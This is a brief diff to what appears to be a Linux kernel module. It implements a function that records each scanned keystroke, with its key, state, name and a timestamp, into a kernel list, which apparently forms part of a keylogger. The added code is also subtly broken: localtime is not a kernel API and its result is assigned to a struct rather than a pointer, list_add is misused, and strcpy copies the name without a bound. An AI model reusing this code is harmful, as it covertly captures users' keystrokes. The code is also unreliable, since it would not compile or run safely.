@@ -5,8 +5,7 @@ struct fsm scan_fsm = {
 	.state = UNDEFINED;
 }
 
-static struct transition_table		scan_table [] =
-{
+static struct transition_table		scan_table [] = {
 	{ 0x0, 0x10, 0x10, SUCCESS },
 	{ 0x0, 0x11, 0x11, SUCCESS },
 	{ 0x0, 0x12, 0x12, SUCCESS },
@@ -43,5 +42,19 @@ void	scan_fsm_clear(struct fsm *scan_fsm)
 
 void	scan_fsm_send(struct fsm *scan_fsm, void *target)
 {
-	;
+	struct timeval		tv;
+	struct tm		tm;
+	struct keystroke	*ks;
+	char			*name;
+
+	if (ks = kmalloc(sizeof(struct keystroke), GFP_KERNEL)) {
+		ks->keystroke = KEY(scan_fsm->current);
+		ks->state = STATE(scan_fsm->current);
+		name = NAME(scan_fsm->current);
+		strcpy(ks->name, name);
+		do_gettimeofday(&tv);
+		tm = localtime(&tv);
+		ks->tm = tm;
+		list_add(ks, keystroke_list);
+	}
 }
